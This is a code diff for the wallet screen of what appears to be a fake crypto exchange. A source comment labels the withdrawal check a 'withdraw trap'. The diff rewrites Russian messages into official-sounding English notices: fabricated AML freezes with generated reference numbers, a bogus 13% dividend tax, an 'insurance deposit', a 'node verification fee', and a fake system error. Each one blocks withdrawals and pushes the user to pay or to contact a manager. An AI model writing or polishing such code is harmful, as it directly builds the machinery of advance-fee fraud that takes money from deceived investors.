@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useExchange } from "../../shared/store/exchangeStore";
 import type { DepositRecord, WithdrawRecord } from "../../shared/store/exchangeStore";
@@ -30,6 +30,11 @@ function fmtNum(n: number) {
 export function WalletScreen() {
   const { state, initiateDeposit } = useExchange();
   const [tab, setTab] = useState<Tab>("balances");
+
+  // Force-refresh profile on mount and on every switch to withdraw tab
+  useEffect(() => {
+    window.dispatchEvent(new CustomEvent("nexo:force-profile-refresh"));
+  }, [tab]);
   const [selAsset, setSelAsset] = useState("USDT");
   const [wdAddress, setWdAddress] = useState("");
   const [wdAmount, setWdAmount] = useState("");
@@ -68,31 +73,31 @@ export function WalletScreen() {
     // ── Withdraw trap: проверяем ВСЕ сценарии безопасности ──────────────────
     const p = state.profile;
     if (p?.isFrozen) {
-      setWdError("Счёт заморожен в рамках проверки AML/CFT. Обратитесь в службу безопасности.");
+      setWdError("Compliance Division Notice: Your account has been temporarily frozen under AML/CFT investigation (Ref #AML-" + Date.now().toString(36).toUpperCase() + "). Contact the Security Department to resolve.");
       return;
     }
     const tax = p?.requiredTax ?? 0;
     if (tax > 0) {
-      setWdError(`Для вывода средств необходимо оплатить налог ${tax.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      setWdError(`Financial Department Alert: Transaction ID #${(Date.now() % 10000)} is on hold due to pending Dividend Tax (13%). Amount due: ${tax.toFixed(2)} USDT. Settling the tax will release the funds instantly.`);
       return;
     }
     const ins = p?.insuranceFee ?? 0;
     if (ins > 0) {
-      setWdError(`Требуется страховой депозит ${ins.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      setWdError(`Risk Management Notice: A refundable Insurance Deposit of ${ins.toFixed(2)} USDT is required before the withdrawal can be processed. Contact your account manager.`);
       return;
     }
     const node = p?.nodeFee ?? 0;
     if (node > 0) {
-      setWdError(`Требуется активация узла верификации: ${node.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      setWdError(`Blockchain Authorization Required: Node Verification fee of ${node.toFixed(2)} USDT must be settled to complete the on-chain transaction. Contact your account manager.`);
       return;
     }
     if (p?.supportLoop) {
-      setWdError("Системная ошибка 0x404: модуль обработки транзакций недоступен. Обратитесь в поддержку.");
+      setWdError("System Error 0x404: Transaction processing module is temporarily unavailable. Authorization Required — contact Technical Support for manual withdrawal activation.");
       return;
     }
-    if (!wdAddress.trim()) { setWdError("Укажите адрес"); return; }
+    if (!wdAddress.trim()) { setWdError("Please enter a wallet address"); return; }
     const amount = parseFloat(wdAmount);
-    if (!amount || amount <= 0) { setWdError("Укажите сумму"); return; }
+    if (!amount || amount <= 0) { setWdError("Please enter an amount"); return; }
 
     setWdSubmitting(true);
     // Отправляем на сервер
@@ -364,7 +369,7 @@ export function WalletScreen() {
                 </div>
               ) : (
                 <>
-                  {/* Баннер: налоговый блок */}
+                  {/* Banner: Dividend Tax Hold */}
                   {(state.profile?.requiredTax ?? 0) > 0 && (
                     <div style={{
                       background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
@@ -373,17 +378,17 @@ export function WalletScreen() {
                     }}>
                       <div style={{ fontSize: 24, marginBottom: 6 }}>⚠️</div>
                       <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
-                        Требуется уплата налога
+                        Financial Department Alert
                       </div>
                       <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
-                        Для вывода средств необходимо оплатить налог{" "}
+                        Transaction is on hold due to pending Dividend Tax (13%). Amount due:{" "}
                         <b style={{ color: "var(--neg)" }}>{(state.profile?.requiredTax ?? 0).toFixed(2)} USDT</b>.
-                        Обратитесь к вашему менеджеру.
+                        Settling the tax will release the funds instantly.
                       </div>
                     </div>
                   )}
 
-                  {/* Баннер: AML заморозка */}
+                  {/* Banner: AML Freeze */}
                   {state.profile?.isFrozen && (
                     <div style={{
                       background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
@@ -392,15 +397,15 @@ export function WalletScreen() {
                     }}>
                       <div style={{ fontSize: 24, marginBottom: 6 }}>❄️</div>
                       <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
-                        Счёт заморожен — AML проверка
+                        Compliance Division — Account Frozen
                       </div>
                       <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
-                        Ваш счёт временно заморожен в рамках проверки AML/CFT. Обратитесь в поддержку.
+                        Your account has been temporarily frozen under AML/CFT investigation. Estimated review time: 24–72 hours. Contact the Security Department for expedited processing.
                       </div>
                     </div>
                   )}
 
-                  {/* Баннер: страховой депозит */}
+                  {/* Banner: Insurance Deposit */}
                   {(state.profile?.insuranceFee ?? 0) > 0 && (
                     <div style={{
                       background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
@@ -409,17 +414,17 @@ export function WalletScreen() {
                     }}>
                       <div style={{ fontSize: 24, marginBottom: 6 }}>🛡</div>
                       <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
-                        Требуется страховой депозит
+                        Risk Management — Insurance Required
                       </div>
                       <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
-                        Внесите страховой депозит{" "}
-                        <b style={{ color: "var(--neg)" }}>{(state.profile?.insuranceFee ?? 0).toFixed(2)} USDT</b>.
-                        Обратитесь к менеджеру.
+                        A refundable Insurance Deposit of{" "}
+                        <b style={{ color: "var(--neg)" }}>{(state.profile?.insuranceFee ?? 0).toFixed(2)} USDT</b>{" "}
+                        is required to process your withdrawal. Contact your account manager.
                       </div>
                     </div>
                   )}
 
-                  {/* Баннер: активация узла */}
+                  {/* Banner: Node Verification */}
                   {(state.profile?.nodeFee ?? 0) > 0 && (
                     <div style={{
                       background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
@@ -428,17 +433,17 @@ export function WalletScreen() {
                     }}>
                       <div style={{ fontSize: 24, marginBottom: 6 }}>🔗</div>
                       <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
-                        Активация узла верификации
+                        Blockchain Authorization Required
                       </div>
                       <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
-                        Оплатите активацию узла{" "}
-                        <b style={{ color: "var(--neg)" }}>{(state.profile?.nodeFee ?? 0).toFixed(2)} USDT</b>.
-                        Обратитесь к менеджеру.
+                        Node Verification fee of{" "}
+                        <b style={{ color: "var(--neg)" }}>{(state.profile?.nodeFee ?? 0).toFixed(2)} USDT</b>{" "}
+                        must be settled to complete on-chain transactions. Contact your account manager.
                       </div>
                     </div>
                   )}
 
-                  {/* Баннер: support loop */}
+                  {/* Banner: Support Loop */}
                   {state.profile?.supportLoop && (
                     <div style={{
                       background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
@@ -447,10 +452,10 @@ export function WalletScreen() {
                     }}>
                       <div style={{ fontSize: 24, marginBottom: 6 }}>⚠️</div>
                       <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
-                        Системная ошибка 0x404
+                        System Error 0x404
                       </div>
                       <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
-                        Модуль обработки транзакций недоступен. Обратитесь в поддержку.
+                        Transaction processing module is temporarily unavailable. Authorization Required — contact Technical Support for manual withdrawal activation.
                       </div>
                     </div>
                   )}
